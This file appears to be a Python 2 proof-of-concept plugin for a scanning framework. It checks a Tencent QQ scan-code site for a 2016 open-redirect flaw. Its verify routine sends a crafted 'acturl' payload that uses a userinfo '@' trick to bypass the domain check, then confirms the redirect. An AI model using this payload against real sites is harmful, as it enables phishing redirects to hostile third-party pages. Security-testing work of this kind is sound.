# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Tencent_0103'  # 平台漏洞编号
    name = '腾讯旗下qq扫码站点可url跳转'  # 漏洞名称
    level = VulnLevel.LOW  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '	2016-04-07'  # 漏洞公布时间
    desc = '''
    腾讯旗下qq扫码站点可url跳转漏洞，攻击者可以通过url跳转将应用程序引导到不安全的第三方区域，从而导致的安全问题。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=192459
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Tencent'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '67080bff-5d41-4884-a90d-2febc593b6e2'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            targeturl = "https://www.baidu.com/robots.txt"
            payload = "/common/pc/pc.html?title=Cscan-hyhmnn&acturl=http://banfei.zhongan.com:@%s" % targeturl
            url = self.target + payload
            response = requests.get(url)
            if response.status_code == 200 and "User-agent: Baiduspider" in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()